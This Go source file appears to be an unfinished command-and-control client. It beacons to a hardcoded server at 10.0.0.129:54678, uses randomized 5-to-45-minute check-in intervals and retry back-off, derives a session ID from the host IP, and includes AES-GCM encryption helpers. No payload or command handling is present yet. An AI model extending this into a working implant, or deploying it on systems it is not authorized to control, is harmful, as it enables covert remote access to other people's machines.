package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"log"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/crypto/pbkdf2"
)

var (
	CVER              string = "0.2.0"
	TYPE              string = "go"
	client            net.Conn
	sessionId         string
	logStream         *log.Logger
	logEnabled        bool   = false
	address           string = "10.0.0.129"
	port              string = "54678"
	startTime                = time.Now().UTC().Date
	exitProcess       bool   = false
	retryMode         bool   = false
	maxRetries        int    = 5
	beaconMinInterval uint32 = 5 * 60 * 1000
	beaconMaxInterval uint32 = 45 * 60 * 1000
	retryIntervals           = [6]uint32{
		10000,
		30000,
		(1 * 60 * 1000),
		(2 * 60 * 1000),
		(4 * 60 * 1000),
		(6 * 60 * 1000),
	}
)

func WriteLog(message string, v ...any) {
	// Set the location of the log file
	logpath := "logs/client.log"
	logDir := filepath.Dir(logpath)

	// Check if the directory exists and create it if not
	if _, err := os.Stat(logDir); os.IsNotExist(err) {
		if err := os.MkdirAll(logDir, 0755); err != nil {
			logEnabled = false
			log.Fatalf("Failed to create log directory: %v", err)
			return
		}
	}

	// Open the log file
	file, err := os.OpenFile(logpath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		logEnabled = false
		log.Fatalf("Failed to open log file: %v", err)
		return
	}
	defer file.Close()

	// Initialize logStream if it's not already
	if logStream == nil {
		logStream = log.New(file, "", log.LstdFlags|log.Lshortfile)
	}

	// Format the message
	if len(v) > 0 {
		message = fmt.Sprintf(message, v...)
	}

	// Write the log message
	if logEnabled {
		logStream.Println(message)
	}
}

func GetSessionID() {
	if client == nil {
		WriteLog("Client is not properly initialized.")
		return
	}

	ipAddress := client.LocalAddr().String()
	if ipAddress == "::1" {
		ipAddress = "127.0.0.1"
	}

	WriteLog("IP Address: %s\n", ipAddress)

	parts := strings.Split(ipAddress, ".")
	sumIp := 0
	for _, part := range parts {
		var partInt int
		fmt.Sscanf(part, "%d", &partInt)
		sumIp += partInt
	}

	data := fmt.Sprintf("%s<>%d", ipAddress, sumIp)
	hash := sha256.New()
	hash.Write([]byte(data))
	hashBytes := hash.Sum(nil)

	crypt := hex.EncodeToString(hashBytes)[:32]
	sessionId = strings.ToLower(crypt)

	WriteLog("Session ID: %s\n", sessionId)
}

func EncryptData(data, sharedKey string) (string, error) {
	salt := make([]byte, 32)
	if _, err := rand.Read(salt); err != nil {
		return "", err
	}

	key := pbkdf2.Key([]byte(sharedKey), salt, 200000, 32, sha512.New)

	iv := make([]byte, 12)
	if _, err := rand.Read(iv); err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aead, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	ciphertext := aead.Seal(nil, iv, []byte(data), nil)
	authTag := aead.Overhead()

	encryptedData := fmt.Sprintf("%s:%s:%s:%s",
		base64.StdEncoding.EncodeToString(salt),
		base64.StdEncoding.EncodeToString(iv),
		base64.StdEncoding.EncodeToString(ciphertext[len(ciphertext)-authTag:]),
		base64.StdEncoding.EncodeToString(ciphertext[:len(ciphertext)-authTag]),
	)

	return encryptedData, nil
}

// DecryptData decrypts the encrypted data using AES-256-GCM with the provided sharedKey
func DecryptData(encrypted, sharedKey string) (string, error) {
	parts := strings.Split(encrypted, ":")
	if len(parts) != 4 {
		return "", fmt.Errorf("invalid encrypted data format")
	}

	salt, err := base64.StdEncoding.DecodeString(parts[0])
	if err != nil {
		return "", err
	}

	iv, err := base64.StdEncoding.DecodeString(parts[1])
	if err != nil {
		return "", err
	}

	authTag, err := base64.StdEncoding.DecodeString(parts[2])
	if err != nil {
		return "", err
	}

	encryptedData, err := base64.StdEncoding.DecodeString(parts[3])
	if err != nil {
		return "", err
	}

	key := pbkdf2.Key([]byte(sharedKey), salt, 200000, 32, sha512.New)

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aead, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	ciphertext := append(encryptedData, authTag...)
	decrypted, err := aead.Open(nil, iv, ciphertext, nil)
	if err != nil {
		return "", err
	}

	return string(decrypted), nil
}

func SendResponse(resp string, conn net.Conn) {
	// Send some data to the server
	_, err := conn.Write([]byte(resp))
	if err != nil {
		WriteLog(err.Error())
		return
	}
}

func HandleConnection(conn net.Conn) {
	// Close the connection when we're done
	defer conn.Close()

	// Read incoming data
	buf := make([]byte, 1024)
	_, err := conn.Read(buf)
	if err != nil {
		WriteLog(err.Error())
		return
	}

	WriteLog("Received: %s", buf)
}

func ConnectToServer() {
	// Connect to the server
	conn, err := net.Dial("tcp", address+":"+port)
	if err != nil {
		WriteLog(err.Error())
		return
	}

	client = conn

	go GetSessionID()

	// Send a response
	go SendResponse("Beacon", client)

	// Handle read response
	go HandleConnection(client)
}

func main() {
	go ConnectToServer()
}
